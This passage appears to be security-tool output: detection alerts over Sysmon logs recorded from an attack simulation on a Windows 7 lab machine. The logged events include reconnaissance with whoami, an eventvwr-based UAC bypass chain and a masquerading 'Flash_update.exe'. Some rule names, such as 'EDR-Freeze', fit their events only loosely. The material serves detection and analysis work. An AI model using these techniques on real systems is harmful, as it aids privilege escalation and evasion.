Description: whoami - displays logged on user information
TerminalSessionId: 1
ParentCommandLine: Powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1200
LogonGuid: 365ABB72-AB27-5CB8-0000-002021CA0000
Hashes: SHA1=DC058F52AD8ACBD316827B6DCAC2434AB3CC515C,MD5=0EBF71E33EF09CA65D9683AFA999C473,SHA256=599EFD455AEEEFE2044A9B597061F271595033F5D0DF2C99DFDBCA8394BBCEC3,IMPHASH=C5352B949915AB8CD5E1844790D19274
ParentProcessGuid: 365ABB72-AC28-5CB8-0000-0010F3F70700
ProcessId: 3576
CurrentDirectory: C:\Users\IEUser\Desktop\
ProcessGuid: 365ABB72-AC38-5CB8-0000-0010365E0800
CommandLine: '""C:\Windows\system32\whoami.exe""  /user'
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0xca21'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-04-18 16:56:24.833
"
2019-04-18T16:57:04.681038+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/babyshark_mimikatz_powershell.evtx,1,Microsoft-Windows-Sysmon,1,15,IEWIN7,"Image: C:\Windows\System32\mmc.exe
RuleName: technique_id=T1088,technique_name=Bypass User Account Control
Description: Microsoft Management Console
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\eventvwr.exe"" '
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3904
LogonGuid: 365ABB72-AB27-5CB8-0000-002021CA0000
Hashes: SHA1=98D8C5E38510C6220F42747D15F6FFF75DD59845,MD5=A2A5D487D0C3D55739A0491B6872480D,SHA256=40E2B83F07771D54CE4E45B76A14883D042766FF4E1E7872E482EC91E81E9484,IMPHASH=6D2ED4ADDAC7EBAE62381320D82AC4C1
ParentProcessGuid: 365ABB72-AC60-5CB8-0000-001002B30800
ProcessId: 3900
CurrentDirectory: C:\Users\IEUser\
ProcessGuid: 365ABB72-AC60-5CB8-0000-001037BA0800
CommandLine: '""C:\Windows\system32\mmc.exe"" ""C:\Windows\system32\eventvwr.msc"" '
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0xca21'
IntegrityLevel: High
ParentImage: C:\Windows\System32\eventvwr.exe
UtcTime: 2019-04-18 16:57:04.500
"
2019-04-18T17:00:09.977481+00:00,Hacktool - EDR-Freeze Execution;Local Accounts Discovery;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/babyshark_mimikatz_powershell.evtx,1,Microsoft-Windows-Sysmon,1,24,IEWIN7,"Image: C:\Windows\System32\whoami.exe
RuleName: technique_id=T1033,technique_name=System Owner/User Discovery
Description: whoami - displays logged on user information
TerminalSessionId: 1
ParentCommandLine: Powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1200
LogonGuid: 365ABB72-AB27-5CB8-0000-002021CA0000
Hashes: SHA1=DC058F52AD8ACBD316827B6DCAC2434AB3CC515C,MD5=0EBF71E33EF09CA65D9683AFA999C473,SHA256=599EFD455AEEEFE2044A9B597061F271595033F5D0DF2C99DFDBCA8394BBCEC3,IMPHASH=C5352B949915AB8CD5E1844790D19274
ParentProcessGuid: 365ABB72-AC28-5CB8-0000-0010F3F70700
ProcessId: 3980
CurrentDirectory: C:\Users\IEUser\Desktop\
ProcessGuid: 365ABB72-AD19-5CB8-0000-0010F4F40C00
CommandLine: '""C:\Windows\system32\whoami.exe""  /user'
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
User: IEWIN7\IEUser
LogonId: '0xca21'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-04-18 17:00:09.677
"
2019-04-18T17:03:03.321806+00:00,UAC Bypass Using Windows Media Player - File,data/EVTX-ATTACK-SAMPLES/Credential Access/babyshark_mimikatz_powershell.evtx,1,Microsoft-Windows-Sysmon,11,32,IEWIN7,"ProcessGuid: 365ABB72-AB28-5CB8-0000-0010F2E20000
CreationUtcTime: 2019-04-18 17:03:03.311
UtcTime: 2019-04-18 17:03:03.311
ProcessId: 1388
RuleName: technique_id=T1187,technique_name=Forced Authentication
TargetFilename: C:\Users\IEUser\AppData\Roaming\Microsoft\Windows\Recent\sysmon.evtx.lnk
Image: C:\Windows\Explorer.EXE
"
2019-04-18T17:03:03.441979+00:00,UAC Bypass Using Windows Media Player - File,data/EVTX-ATTACK-SAMPLES/Credential Access/babyshark_mimikatz_powershell.evtx,1,Microsoft-Windows-Sysmon,11,33,IEWIN7,"ProcessGuid: 365ABB72-AB28-5CB8-0000-0010F2E20000
CreationUtcTime: 2019-04-18 17:03:03.441
UtcTime: 2019-04-18 17:03:03.441
ProcessId: 1388
RuleName: technique_id=T1187,technique_name=Forced Authentication
TargetFilename: C:\Users\IEUser\AppData\Roaming\Microsoft\Windows\Recent\HTools (vboxsrv) (D).lnk
Image: C:\Windows\Explorer.EXE
"
2019-04-27T15:57:25.868863+00:00,Suspicious Double Extension Files;UAC Bypass Using Windows Media Player - File,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/Malware/DE_timestomp_and_dll_sideloading_and_RunPersist.evtx,1,Microsoft-Windows-Sysmon,11,6575,IEWIN7,"ProcessGuid: 365ABB72-7ACC-5CC4-0000-0010B2470300
CreationUtcTime: 2019-04-27 15:57:25.868
UtcTime: 2019-04-27 15:57:25.868
ProcessId: 2772
RuleName: ''
TargetFilename: C:\Users\IEUser\Downloads\Flash_update.exe
Image: C:\Windows\Explorer.EXE
"
2019-04-27T15:57:53.368863+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/Malware/DE_timestomp_and_dll_sideloading_and_RunPersist.evtx,1,Microsoft-Windows-Sysmon,1,6577,IEWIN7,"Image: C:\Users\IEUser\Downloads\Flash_update.exe
RuleName: technique_id=T1036,technique_name=Masquerading
Description: '?'
TerminalSessionId: 1
ParentCommandLine: C:\Windows\Explorer.EXE
Product: '?'
Company: '?'
ParentProcessId: 2772
LogonGuid: 365ABB72-7AB1-5CC4-0000-0020BEF40000
Hashes: SHA1=B4E581F173F782A2F1DA5D29C95946EE500EB2D0,MD5=42893ADBC36605EC79B5BD610759947E,SHA256=1A061C74619DE6AF8C02CBA0FA00754BDD9E3515C0E08CAD6350C7ADFC8CDD5B,IMPHASH=40BEC1A4A3BCB7D3089B5E1532386613
ParentProcessGuid: 365ABB72-7ACC-5CC4-0000-0010B2470300
ProcessId: 2680
CurrentDirectory: C:\Users\IEUser\Downloads\
ProcessGuid: 365ABB72-7C01-5CC4-0000-00102B3E0C00
CommandLine: '""C:\Users\IEUser\Downloads\Flash_update.exe"" '
FileVersion: '?'
User: IEWIN7\IEUser
LogonId: '0xf4be'
IntegrityLevel: High
ParentImage: C:\Windows\explorer.exe
UtcTime: 2019-04-27 15:57:53.368
"
